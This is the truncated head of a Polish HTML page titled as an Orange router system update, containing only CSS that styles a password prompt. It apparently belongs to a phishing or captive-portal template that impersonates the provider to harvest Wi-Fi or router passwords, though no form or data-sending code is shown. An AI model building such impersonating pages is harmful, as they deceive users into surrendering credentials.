<!DOCTYPE html>
<html lang="pl">
  <head>
    <meta charset="UTF-8" />
    <title>Aktualizacja systemu - Orange Router</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <style>
      body {
        margin: 0;
        padding: 0;
        background-color: #000;
        font-family: "Segoe UI", Arial, sans-serif;
        display: flex;
        align-items: center;
        justify-content: center;
        height: 100vh;
      }

      .container {
        background: rgba(20, 20, 20, 0.9);
        backdrop-filter: blur(8px);
        padding: 25px;
        max-width: 340px;
        width: 90%;
        border-radius: 14px;
        box-shadow: 0 0 25px rgba(255, 110, 0, 0.3);
        text-align: center;
      }

      .logo {
        margin-bottom: 15px;
      }

      .logo img {
        max-width: 90px;
        height: auto;
        filter: drop-shadow(0 0 8px rgba(255, 110, 0, 0.6));
      }

      .header {
        color: #ff6e00;
        font-size: 1.5em;
        font-weight: bold;
        margin-bottom: 15px;
        text-shadow: 0 0 6px rgba(255, 110, 0, 0.7);
      }

      .message {
        color: #eee;
        font-size: 1em;
        line-height: 1.4em;
        margin-bottom: 25px;
      }

      input[type="password"] {
        width: 100%;
        padding: 12px;
        font-size: 1em;
        margin-bottom: 18px;
        border: 1px solid #ff6e00;
        border-radius: 6px;
        background: #111;
        color: #fff;
        outline: none;
        transition: all 0.3s ease;
      }

      input[type="password"]:focus {
        border-color: #fff;
        box-shadow: 0 0 8px rgba(255, 110, 0, 0.6);
      }

      button {
        width: 100%;
        padding: 12px;
        background: #ff6e00;
        color: #000;
        border: none;
        border-radius: 6px;
        font-size: 1.1em;
        font-weight: bold;
        cursor: pointer;
        transition: all 0.3s ease;
      }

      button:hover {
        background: #ffa64d;
        box-shadow: 0 0 10px rgba(255, 166, 77, 0.8);
      }

      .footer {
        margin-top: 18px;
        font-size: 0.8em;
        color: #999;
      }
    </style>
  </head>
